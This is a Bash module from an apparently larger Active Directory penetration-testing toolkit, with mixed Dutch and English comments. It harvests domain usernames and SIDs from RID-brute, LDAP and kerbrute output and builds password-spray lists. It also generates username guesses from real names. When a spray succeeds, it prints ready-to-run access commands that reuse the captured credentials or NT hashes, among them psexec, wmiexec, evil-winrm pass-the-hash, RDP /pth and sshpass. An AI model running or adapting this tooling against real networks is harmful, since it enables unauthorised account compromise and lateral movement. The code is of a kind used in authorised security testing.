#!/bin/bash
# MODULE: users.sh - User export, output processing, username generation, consolidation


# ============================================================================
# EXPORT CONFIRMED DOMAIN GEBRUIKERS / SID TO CWD (re-usable spray input)
# ============================================================================
CONFIRMED_DOMAIN_USERS_FILE="${PWD}/confirmeddomainusers.txt"
CONFIRMED_DOMAIN_SID_FILE="${PWD}/confirmeddomainSID.txt"

export_users_from_lookupsid() {
    local f="$1"
    [[ -s "$f" ]] || return 0

    # Domein SID
    local sid
    sid=$(grep -oE 'Domain SID is: S-[0-9-]+' "$f" | head -n1 | awk '{print $NF}')
    if [[ -n "$sid" ]]; then
        grep -qxF "$sid" "$CONFIRMED_DOMAIN_SID_FILE" 2>/dev/null || echo "$sid" >> "$CONFIRMED_DOMAIN_SID_FILE"
    fi

    # Gebruikers (SidTypeUser), zonder machine-accounts ($)
    # Ik parse hier expres alleen regels met "(SidTypeUser)" zodat groepsnamen met spaties
    # (zoals "Enterprise Admins") niet in losse woorden uiteenvallen.
    grep 'SidTypeUser)' "$f" 2>/dev/null | \
        sed -n 's/.*\\\([^[:space:]]\+\)[[:space:]]*(SidTypeUser).*/\1/p' | \
        grep -v '\$' | \
        grep -E '^[A-Za-z][A-Za-z0-9._-]*$' | \
        sort -u | while read -r u; do
            grep -qxF "$u" "$CONFIRMED_DOMAIN_USERS_FILE" 2>/dev/null || echo "$u" >> "$CONFIRMED_DOMAIN_USERS_FILE"
        done
}

export_users_from_nxc_domain_users() {
    local f="$1"
    [[ -s "$f" ]] || return 0
    # Ik pak alleen echte LDAP user-rijen uit nxc --users output:
    # veld 5 is de gebruikersnaam in de tabel, terwijl status/progress regels "[*]/[+]" bevatten.
    awk '$1=="LDAP" && $2 ~ /^[0-9.]+$/ && $5 !~ /^\[/ && $5 !~ /^-/ {print $5}' "$f" 2>/dev/null | \
        grep -v '\$' | \
        grep -E '^[A-Za-z][A-Za-z0-9._-]*$' | \
        sort -u | while read -r u; do
            grep -qxF "$u" "$CONFIRMED_DOMAIN_USERS_FILE" 2>/dev/null || echo "$u" >> "$CONFIRMED_DOMAIN_USERS_FILE"
        done
}


process_output() {
    local cred_type="${1:-password}"
    
    while IFS= read -r line; do
        line=$(strip_literal_ansi "$line")
        line=${line//$'\r'/}
        echo "$line" >> "$RESULTS"
        
        if [[ "$line" == *"[+]"* ]]; then
            parse_cred_line "$line"
            local parse_result=$?
            
            if [[ $parse_result -eq 0 ]]; then
                # Check if this is alleen-guest toegang (not echte creds)
                local is_guest_only=false
                if [[ "$line" == *"(Guest)"* && "$line" != *"Pwn3d"* ]]; then
                    is_guest_only=true
                fi
                
                # Check if gebruikersnaam looks like a bestandspad (fout)
                local cred_display
                cred_display=$(printf '%s' "$line" | sed 's/.*\[+\] *//' | awk '{print $1}')
                local username_part=$(echo "$cred_display" | cut -d':' -f1 | sed 's/.*\\//')
                
                if [[ "$username_part" == *".txt" || "$username_part" == *".lst" ]]; then
                    # This is a bestandspad being treated as a gebruikersnaam - sla over
                    echo -e "${YELLOW}[warn] Skipping invalid credential (file path as username): $cred_display${NC}"
                elif [[ "$is_guest_only" == true ]]; then
                    # Guest access - just note it, don't toon grote banner
                    echo -e "${YELLOW}[guest] $line${NC}"
                else
                    # Real credentials - haal and show banner
                    extract_creds "$line" "$cred_type"
                    emit_live_commands_from_line "$line" "$cred_type"
                    
                    echo ""
                    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
                    echo -e "${GREEN}║            VALID CREDENTIALS FOUND                        ║${NC}"
                    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
                    printf "%b%s%b\n" "$GREEN" "$line" "$NC"
                    printf "%b>>> CREDS: %s%b\n" "$GREEN" "$cred_display" "$NC"
                    [[ "$line" == *"Pwn3d"* ]] && echo -e "${RED}>>> ADMIN ACCESS! (Pwn3d)${NC}"
                    # ── Quick-access commands inline when creds found ──────────
                    local _q_proto _q_ip _q_dom _q_user _q_pass _q_pwned
                    _q_proto=$(printf '%s' "$line" | awk '{print $1}')
                    _q_ip=$(printf '%s' "$line" | awk '{print $2}')
                    local _q_credpart; _q_credpart=$(printf '%s' "$line" | sed 's/.*\[+\] *//' | awk '{print $1}')
                    # Parse DOMAIN\user:pass with awk — avoids 'grep: Trailing backslash'
                    local _q_userpart; _q_userpart=$(printf '%s' "$_q_credpart" | cut -d':' -f1)
                    _q_pass=$(printf '%s' "$_q_credpart" | cut -d':' -f2-)
                    _q_dom=$(printf '%s' "$_q_userpart" | awk -F'\\\\' 'NF>1{print $1}')
                    _q_user=$(printf '%s' "$_q_userpart" | awk -F'\\\\' '{print $NF}')
                    [[ -z "$_q_dom" ]] && _q_dom="${DOMAIN:-}"
                    _q_pwned="no"; [[ "$line" == *"Pwn3d"* ]] && _q_pwned="yes"
                    local _q_impacket
                    if [[ -n "$_q_dom" ]]; then
                        _q_impacket="${_q_dom}/${_q_user}:${_q_pass}@${_q_ip}"
                    else
                        _q_impacket="${_q_user}:${_q_pass}@${_q_ip}"
                    fi
                    # ── Detect hash vs password for correct command syntax ──────
                    # A hash is 32 hex chars (NT) or LM:NT (32:32). cred_type passed
                    # from spray mode tells us which it is — use that to pick syntax.
                    local _q_is_hash=false
                    if [[ "$cred_type" == "hash" ]]; then
                        _q_is_hash=true
                    elif [[ "$_q_pass" =~ ^[0-9a-fA-F]{32}$ || "$_q_pass" =~ ^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$ ]]; then
                        _q_is_hash=true
                    fi

                    # Build correct impacket auth string
                    local _q_dom_prefix="${_q_dom:+$_q_dom/}"
                    local _q_imp_pass   # impacket plaintext auth: "domain/user:pass@ip"
                    local _q_imp_hash   # impacket hash auth args:  "-hashes :HASH 'domain/user@ip'"
                    _q_imp_pass="${_q_dom_prefix}${_q_user}:${_q_pass}@${_q_ip}"
                    _q_imp_hash="-hashes ':${_q_pass}' '${_q_dom_prefix}${_q_user}@${_q_ip}'"

                    echo -e "${CYAN}  → Immediate access options:${NC}"
                    case "${_q_proto^^}" in
                    SMB)
                        # smbclient.py for browsing shares (interactive shell)
                        if [[ "$_q_is_hash" == true ]]; then
                            echo -e "${WHITE}  >> smbclient.py '${_q_dom_prefix}${_q_user}@${_q_ip}' -hashes ':${_q_pass}'${NC}"
                            if [[ "$_q_pwned" == "yes" ]]; then
                                echo -e "${WHITE}  >> impacket-psexec ${_q_imp_hash}${NC}"
                                echo -e "${WHITE}  >> impacket-wmiexec ${_q_imp_hash}${NC}"
                            fi
                        else
                            echo -e "${WHITE}  >> smbclient.py '${_q_imp_pass}'${NC}"
                            if [[ "$_q_pwned" == "yes" ]]; then
                                echo -e "${WHITE}  >> impacket-psexec '${_q_imp_pass}'${NC}"
                                echo -e "${WHITE}  >> impacket-wmiexec '${_q_imp_pass}'${NC}"
                            else
                                echo -e "${GRAY}  >> impacket-wmiexec '${_q_imp_pass}'${NC}"
                            fi
                        fi ;;
                    WINRM)
                        # evil-winrm: -p for password, -H for hash
                        if [[ "$_q_is_hash" == true ]]; then
                            echo -e "${WHITE}  >> evil-winrm -i ${_q_ip} -u '${_q_user}' -H '${_q_pass}'${NC}"
                        else
                            echo -e "${WHITE}  >> evil-winrm -i ${_q_ip} -u '${_q_user}' -p '${_q_pass}'${NC}"
                        fi ;;
                    RDP)
                        if [[ "$_q_is_hash" == true ]]; then
                            echo -e "${WHITE}  >> xfreerdp3 /u:'${_q_user}' /d:'${_q_dom}' /pth:'${_q_pass}' /v:${_q_ip} /dynamic-resolution${NC}"
                        else
                            echo -e "${WHITE}  >> xfreerdp3 /u:'${_q_user}' /p:'${_q_pass}' /d:'${_q_dom}' /v:${_q_ip} /dynamic-resolution${NC}"
                        fi ;;
                    SSH)
                        echo -e "${WHITE}  >> ssh '${_q_user}@${_q_ip}'   # password: ${_q_pass}${NC}"
                        echo -e "${WHITE}  >> sshpass -p '${_q_pass}' ssh -o StrictHostKeyChecking=no '${_q_user}@${_q_ip}'${NC}" ;;
                    WMI|RPC)
                        if [[ "$_q_is_hash" == true ]]; then
                            echo -e "${WHITE}  >> impacket-wmiexec ${_q_imp_hash}${NC}"
                            echo -e "${WHITE}  >> impacket-psexec ${_q_imp_hash}${NC}"
                        else
                            echo -e "${WHITE}  >> impacket-wmiexec '${_q_imp_pass}'${NC}"
                            echo -e "${GRAY}  >> impacket-psexec '${_q_imp_pass}'${NC}"
                        fi ;;
                    FTP)
                        echo -e "${WHITE}  >> ftp ${_q_ip}  # ${_q_user}:${_q_pass}${NC}" ;;
                    MSSQL)
                        if [[ "$_q_is_hash" == true ]]; then
                            echo -e "${WHITE}  >> impacket-mssqlclient '${_q_user}'@${_q_ip} -hashes ':${_q_pass}' -windows-auth${NC}"
                        else
                            echo -e "${WHITE}  >> impacket-mssqlclient '${_q_user}':'${_q_pass}'@${_q_ip} -windows-auth${NC}"
                        fi ;;
                    LDAP)
                        echo -e "${WHITE}  >> ldapsearch -x -H ldap://${_q_ip} -D '${_q_user}' -w '${_q_pass}' -b '' -s base${NC}"
                        echo -e "${GRAY}  >> bloodhound-python -u '${_q_user}' -p '${_q_pass}' -ns ${_q_ip} -c all${NC}" ;;
                    esac
                    echo ""
                    
                    echo "$line" >> "$OUTDIR/successful_logins.txt"
                    [[ "$line" == *"Pwn3d"* ]] && echo "$line" >> "$OUTDIR/pwned_hosts.txt"
                fi
            elif [[ $parse_result -eq 1 ]]; then
                echo -e "${YELLOW}[null] $line${NC}"
                echo "$line" >> "$OUTDIR/null_sessions.txt"
            else
                echo "$line"
            fi
        else
            echo "$line"
        fi
    done
}

process_anon_output() {
    local service="$1"
    while IFS= read -r line; do
        line=$(strip_literal_ansi "$line")
        line=${line//$'\r'/}
        echo "$line" >> "$RESULTS"
        echo "$line"
        [[ "$line" == *"[+]"* ]] && echo "[$service] $line" >> "$OUTDIR/anon_access.txt"
    done
}

# ============================================================================
# Gebruikersnaam-format generatie
# ============================================================================
generate_username_formats() {
    local input_file="$1"
    local output_file="$2"
    
    echo -e "${CYAN}[*] Generating username formats...${NC}"
    
    > "$output_file"
    
    while IFS= read -r name || [[ -n "$name" ]]; do
        [[ -z "$name" ]] && continue
        [[ "$name" == *"@"* ]] && continue  # Skip emails
        [[ "$name" =~ ^[0-9] ]] && continue  # Skip if starts with number
        
        # Clean the name
        name=$(echo "$name" | sed 's/[^a-zA-Z. ]//g' | xargs)
        [[ -z "$name" ]] && continue
        
        # Check if it looks like "Eerst Laatste" or "Eerst.Laatste" format
        if [[ "$name" == *" "* ]]; then
            local first=$(echo "$name" | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
            local last=$(echo "$name" | awk '{print $NF}' | tr '[:upper:]' '[:lower:]')
        elif [[ "$name" == *"."* ]]; then
            local first=$(echo "$name" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
            local last=$(echo "$name" | cut -d'.' -f2- | tr '[:upper:]' '[:lower:]' | tr '.' ' ' | awk '{print $NF}')
        else
            # Enkele word - just uitvoer as-is
            echo "$name" | tr '[:upper:]' '[:lower:]' >> "$output_file"
            continue
        fi
        
        [[ -z "$first" || -z "$last" ]] && continue
        
        local fi="${first:0:1}"  # First initial
        local li="${last:0:1}"   # Last initial
        
        # Genereer common formats
        echo "$first.$last" >> "$output_file"      # john.smith
        echo "$first$last" >> "$output_file"       # johnsmith
        echo "$fi$last" >> "$output_file"          # jsmith
        echo "$fi.$last" >> "$output_file"         # j.smith
        echo "$first$li" >> "$output_file"         # johns
        echo "$first.$li" >> "$output_file"        # john.s
        echo "$first" >> "$output_file"            # john
        echo "$last$fi" >> "$output_file"          # smithj
        echo "$last.$fi" >> "$output_file"         # smith.j
        echo "$last$first" >> "$output_file"       # smithjohn
        echo "${first}_${last}" >> "$output_file"  # john_smith
        echo "${fi}${last}" >> "$output_file"      # jsmith (duplicate but ensures it)
        
    done < "$input_file"
    
    # Sorteereer en ontdubbel
    sort -u "$output_file" -o "$output_file"
    local count=$(wc -l < "$output_file")
    echo -e "${GREEN}[+] Generated $count username variations${NC}"
}

# ============================================================================
# Ik markeer sectie: USER CONSOLIDATION
# ============================================================================
consolidate_users() {
    echo -e "\n${CYAN}[*] Consolidating discovered users...${NC}"
    
    # Haal from ALL rid_brute files (null, guest, anonymous)
    for rbfile in "$OUTDIR"/rid_brute*.txt; do
        [[ -f "$rbfile" ]] && {
            grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' "$rbfile" | sed -E 's/\\033\[[0-9;]*m//g' >> "$ENUM_USERS"
        }
    done
    
    # Also include gebruikers_found.txt directly (consolidated RID brute results)
    [[ -s "$OUTDIR/users_found.txt" ]] && {
        cat "$OUTDIR/users_found.txt" >> "$ENUM_USERS"
    }

    # Ik neem lookupsid-resultaten ook mee (SidTypeUser), zodat gebruikers uit SID-bruteforce
    # niet verloren gaan als LDAP enum later faalt of wordt overgeslagen.
    for lufile in "$OUTDIR"/lookupsid*.txt "$OUTDIR"/*lookupsid*.txt; do
        [[ -f "$lufile" ]] || continue
        sed -E 's/\\033\[[0-9;]*m//g' "$lufile" | \
            grep 'SidTypeUser)' | \
            sed -n 's/.*\\\([^[:space:]]\+\)[[:space:]]*(SidTypeUser).*/\1/p' >> "$ENUM_USERS"
    done
    
    [[ -f "$OUTDIR/domain_users.txt" ]] && {
        # Ik pak alleen de echte LDAP user-tabelrijen (veld 5 = username) en sla status/progressregels over.
        sed -E 's/\\033\[[0-9;]*m//g' "$OUTDIR/domain_users.txt" | awk '$1=="LDAP" && $2 ~ /^[0-9.]+$/ && $5 !~ /^\[/ && $5 !~ /^-/ {print $5}' >> "$ENUM_USERS"
    }
    
    [[ -f "$OUTDIR/smb_users.txt" ]] && {
        awk '/^\s*[A-Za-z]/ && !/Username/ && !/SMB/ {print $1}' "$OUTDIR/smb_users.txt" >> "$ENUM_USERS"
    }
    
    [[ -f "$OUTDIR/ldap_anon_users.txt" ]] && {
        # Zelfde parser als boven: alleen tabelrijen, geen statusregels zoals "Running nxc against..."
        sed -E 's/\\033\[[0-9;]*m//g' "$OUTDIR/ldap_anon_users.txt" | awk '$1=="LDAP" && $2 ~ /^[0-9.]+$/ && $5 !~ /^\[/ && $5 !~ /^-/ {print $5}' >> "$ENUM_USERS"
    }
    
    # Also haal from kerbrute if available
    [[ -f "$OUTDIR/kerbrute_valid.txt" ]] && {
        grep -oP 'VALID.*@' "$OUTDIR/kerbrute_valid.txt" 2>/dev/null | sed 's/VALID.*: //;s/@.*//' >> "$ENUM_USERS"
    }
    
    [[ -f "$OUTDIR/kerbrute_output.txt" ]] && {
        grep -oP 'VALID USERNAME:\s*\K[^@\s]+' "$OUTDIR/kerbrute_output.txt" 2>/dev/null >> "$ENUM_USERS"
    }
    
    # Comprehensive filtering to remove tool-uitvoer artifacts:
    # [*], [-], [+] etc (NXC/tool status markers)
    # impacket (from Impacket version headers)
    # Lines with version strings or tool names
    # Lines starting with special characters
    # Known service accounts and ingeldige patroons
    cat "$ENUM_USERS" "$ALL_USERS" 2>/dev/null | \
        tr '[:upper:]' '[:lower:]' | \
        sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
        grep -v '^$' | \
        grep -v '^\-' | \
        grep -v '^\[' | \
        grep -v '^\]' | \
        grep -v '^username' | \
        grep -v 'healthmailbox' | \
        grep -v '^\$' | \
        grep -v '^sm_' | \
        grep -v '^impacket' | \
        grep -v '^running$' | \
        grep -v '^name$' | \
        grep -v '^email$' | \
        grep -v '^password' | \
        grep -v '^lastlogon' | \
        grep -v '^querying' | \
        grep -v '^running$' | \
        grep -v '^error' | \
        grep -v 'copyright' | \
        grep -v 'fortra' | \
        grep -v '\.py$' | \
        grep -v '^#' | \
        grep -v 'v[0-9]' | \
        grep -E '^[a-z][a-z0-9._-]*$' | \
        sort -u > "$OUTDIR/all_users_clean.txt"
    
    cat "$ENUM_USERS" "$ALL_USERS" 2>/dev/null | \
        sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
        grep -v '^$' | \
        grep -v '^\-' | \
        grep -v '^\[' | \
        grep -v '^\]' | \
        grep -v '^username' | \
        grep -v '^impacket' | \
        grep -v 'copyright' | \
        grep -v 'fortra' | \
        grep -E '^[A-Za-z][A-Za-z0-9._-]*$' | \
        sort -u > "$OUTDIR/all_users_full.txt"
    
    # Create confirmed_users.txt with proper case preservation - the definitive user list
    # This combines ALL sources: LDAP --users, SMB --users, RID brute, kerbrute
    {
        # From LDAP domain users (preserves case)
        [[ -f "$OUTDIR/domain_users.txt" ]] && \
            sed -E 's/\\033\[[0-9;]*m//g' "$OUTDIR/domain_users.txt" | \
            awk '$1=="LDAP" && $5 !~ /^\[/ && $5 !~ /^-/ && $5 ~ /^[A-Za-z]/ {print $5}' | \
            grep -v '^Username' | grep -v '^Running'

        # From SMB users (preserves case)
        # nxc --users output: SMB <ip> <port> <hostname> <Username> <LastPW> <BadPW> <Desc>
        # Strip any residual ANSI, then take $5 where it looks like a username
        [[ -f "$OUTDIR/smb_users.txt" ]] && \
            sed -E 's/\x1B\[[0-9;?]*[a-zA-Z]//g; s/\\033\[[0-9;]*m//g' "$OUTDIR/smb_users.txt" | \
            awk '$1=="SMB" && NF>=5 && $5 !~ /^\[/ && $5 !~ /^-/ && $5 ~ /^[A-Za-z]/ {print $5}' | \
            grep -Ev '^(Username|Running|Enumerated|Error)' | \
            grep -v '\$'
        
        # From RID brute (preserves case)
        for rbfile in "$OUTDIR"/rid_brute*.txt; do
            [[ -f "$rbfile" ]] && \
                sed -E 's/\\033\[[0-9;]*m//g' "$rbfile" | \
                grep -oP '\\\K[^\s]+(?=\s+\(SidTypeUser)' 
        done
        
        # From kerbrute validated users
        [[ -f "$OUTDIR/users_validated.txt" ]] && cat "$OUTDIR/users_validated.txt"
        [[ -f "$OUTDIR/valid_users_kerbrute.txt" ]] && cat "$OUTDIR/valid_users_kerbrute.txt"
        
    } 2>/dev/null | \
        sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | \
        grep -v '^$' | \
        grep -v '^\[' | \
        grep -v '^Running' | \
        grep -v '^Enumerated' | \
        grep -v '^-' | \
        grep -E '^[A-Za-z][A-Za-z0-9._-]*$' | \
        sort -u > "$OUTDIR/confirmed_users.txt"

    local clean_count=$(wc -l < "$OUTDIR/all_users_clean.txt" 2>/dev/null || echo 0)
    local full_count=$(wc -l < "$OUTDIR/all_users_full.txt" 2>/dev/null || echo 0)
    local confirmed_count=$(wc -l < "$OUTDIR/confirmed_users.txt" 2>/dev/null || echo 0)

    if [[ "$confirmed_count" -gt 0 || "$full_count" -gt 0 ]]; then
        echo -e "${GREEN}[+] Users consolidated:${NC}"
        [[ "$confirmed_count" -gt 0 ]] && \
            echo -e "    ${YELLOW}$OUTDIR/confirmed_users.txt${NC}  ($confirmed_count users, ORIGINAL CASE)  ← use as -U input"
        [[ "$full_count" -gt 0 && "$confirmed_count" -eq 0 ]] && \
            echo -e "    $OUTDIR/all_users_full.txt    ($full_count users, includes all)"
    else
        echo -e "${GRAY}[*] No users collected yet (will update after Phase 6B SMB enum)${NC}"
    fi
}

